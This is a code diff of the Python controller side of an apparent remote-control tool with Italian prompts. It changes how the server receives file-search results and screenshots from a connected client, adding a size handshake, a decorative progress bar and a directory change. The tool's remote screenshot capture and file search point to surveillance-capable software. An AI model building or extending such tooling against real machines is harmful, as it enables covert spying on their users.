@@ -215,12 +215,12 @@ def remoteControl(clientConnection):
                 sleep(1)
 
             elif comando[0:4] == "find":
-                listresult = pickle.loads(clientConnection.recv(80000000))
-
-                for item in listresult:
-                    print("-: " + item)
-                    fileLog = fileLog + "\n" + "-: " + item + "\n"
-
+                try:
+                    dato=clientConnection.recv(80000000).decode(FORMAT)
+                    print(dato)
+                    fileLog = fileLog + "\n" + dato + "\n"
+                except:
+                    traceback.print_exc()
             elif comando == "clear":
                 clearScreen()
             elif comando == "help":
@@ -232,11 +232,27 @@ def remoteControl(clientConnection):
                 print(output)
                 fileLog = fileLog + "\n" + output + "\n"
             elif comando[0:10] == "screenshot":
-                myScreenshot=clientConnection.recv(1310720000)
-                nomeFoto=input("Inserisci il nome della foto: ")
-                file = open(nomeFoto, "wb")
-                file.write(myScreenshot)
-                file.close()
+                try:
+                    # Write File in binary
+                    nomeFoto=input("Inserire nome foto: ")
+                    file = open(nomeFoto, 'wb')
+                    # Keep receiving data from the server
+                    filea=clientConnection.recv(1024)
+                    filesize = filea.decode(FORMAT)
+                    print(filesize)
+                    if filesize == "Download fallito":
+                        print(filesize)
+                    else:
+                        for i in tqdm(range(20), desc=Fore.LIGHTWHITE_EX + "Completamento Operazione", colour="green",
+                                      ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
+                            sleep(0.2)
+                        file.write(clientConnection.recv(int(filesize)))
+
+                    time.sleep(2)
+                    file.close()
+                except:
+                    traceback.print_exc()
+                    print("Download fallito\n")
             else:
                print("Si è verificato un errore, verifica il comando...\n")
 
@@ -340,6 +356,7 @@ def main():
                 file.close()
                 fileLog=""
                 print(f"[INFO] The server keeps listening...")
+                os.chdir("..")
                 t_end = time.time() + 3
                 while time.time() < t_end:
                     print(".", end="")
